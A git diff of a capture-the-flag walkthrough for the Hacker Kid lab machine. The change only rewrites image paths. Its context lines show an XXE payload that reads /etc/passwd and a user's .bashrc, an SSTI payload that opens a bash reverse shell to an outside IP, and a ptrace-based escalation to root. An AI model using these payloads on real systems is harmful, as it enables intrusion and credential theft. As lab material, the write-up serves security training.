@@ -30,11 +30,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 - Index Page
 
-![website.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/website.png)
+![website.png](./Images/website.png)
 
 - Login Page on port 9999
 
-![login-page.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/login-page.png)
+![login-page.png](./Images/login-page.png)
 
 ---
 
@@ -42,7 +42,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 - HINT →  Source Code
 
-![hint.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/hint.png)
+![hint.png](./Images/hint.png)
 
 ```bash
 /page_no
@@ -66,7 +66,7 @@ ffuf -u http://192.168.163.196/?page_no=FUZZ -w output
 
 - Success
 
-![subdomain-hint.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/subdomain-hint.png)
+![subdomain-hint.png](./Images/subdomain-hint.png)
 
 ```
 Okay so you want me to speak something ?
@@ -76,7 +76,7 @@ Out of my many homes...one such home..one such home for me : **hackers.blackhat.
 
 - we need to save this domain name to /etc/hosts
 
-![hosts-file.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/e7546f39-2e77-49b3-b3c1-9cebdb312ef1.png)
+![hosts-file.png](./Images/hosts-file.png)
 
 - After some time we find out subdomain name
 - Found another subdomain
@@ -85,13 +85,13 @@ Out of my many homes...one such home..one such home for me : **hackers.blackhat.
 dig http://hackers.blackhat.local @192.168.163.196
 ```
 
-![vhost.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/vhost.png)
+![vhost.png](./Images/vhost.png)
 
 ---
 
 ### website → subdomain
 
-![vhost-success.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/vhost-success.png)
+![vhost-success.png](./Images/vhost-success.png)
 
 ---
 
@@ -109,7 +109,7 @@ dig http://hackers.blackhat.local @192.168.163.196
 <!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]>
 ```
 
-![XML-injection.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/XML-injection.png)
+![XML-injection.png](./Images/XML-injection.png)
 
 - We know there is a user name → saket
 - We can see the .bashrc file for saket
@@ -122,12 +122,12 @@ dig http://hackers.blackhat.local @192.168.163.196
 <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/home/saket/.bashrc">]>
 ```
 
-![password-saket.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/password-saket.png)
+![password-saket.png](./Images/password-saket.png)
 
 - The bashrc file is base64 encoded
 - we can use cyberchef to decode this base64
 
-![bashrc-encode.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/bashrc-encode.png)
+![bashrc-encode.png](./Images/bashrc-encode.png)
 
 ```
 password = Saket!#$%@!!
@@ -145,7 +145,7 @@ username = saket
 password = Saket!#$%@!!
 ```
 
-![login-success.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/70649414-413d-461a-88f9-d7bf00602c8a.png)
+![login-success.png](./Images/login-success.png)
 
 ---
 
@@ -161,7 +161,7 @@ password = Saket!#$%@!!
 
 - Success in Server Side Template Injection
 
-![SSTI.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/SSTI.png)
+![SSTI.png](./Images/SSTI.png)
 
 > **NOTE: Make sure the payload is encoded otherwise it wont work.**
 > 
@@ -172,14 +172,14 @@ password = Saket!#$%@!!
 {%import os%}{{os.system('bash -c "bash -i >& /dev/tcp/10.176.154.65/1337 0>&1"')}}
 ```
 
-![ssti-payload.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/ssti-payload.png)
+![ssti-payload.png](./Images/ssti-payload.png)
 
 > **Successfully get a Reverse Shell**
 > 
 
-![shell.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/shell.png)
+![shell.png](./Images/shell.png)
 
-![rev-shell.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/rev-shell.png)
+![rev-shell.png](./Images/rev-shell.png)
 
 ---
 
@@ -188,7 +188,7 @@ password = Saket!#$%@!!
 - Run Linpeas to get more information about the target system.
 - Found → python2.7
 
-![python-suid.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/720fde40-3949-4e0d-8dc9-15fce8dc4ffe.png)
+![python-suid.png](./Images/python-suid.png)
 
 > **Reference:** https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc
 > 
@@ -290,13 +290,13 @@ ps -eaf | grep root
 python2.7 inject.py 970 
 ```
 
-![process.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/d2095359-d44f-429b-a5af-23bc060a36c7.png)
+![process.png](./Images/process.png)
 
-![upload-payload.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/fa29f639-3c76-4cb4-a5e3-cf9f513fac29.png)
+![upload-payload.png](./Images/upload-payload.png)
 
 ---
 
-![payload-upload.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/fd4131cc-1635-426f-9938-3f2dffe26a98.png)
+![payload-upload.png](./Images/payload-upload.png)
 
 - Now start another netcat listening on port 5600
 
@@ -306,4 +306,4 @@ nc <target_IP> 5600
 
 - Successfully get a root shell
 
-![root.png](Hacker%20Kid%201%200%201%2024403ee046f580d8bd7dd4735d2811c0/10c0c02d-fe51-438a-be31-238160478529.png)
+![root.png](./Images/root.png)
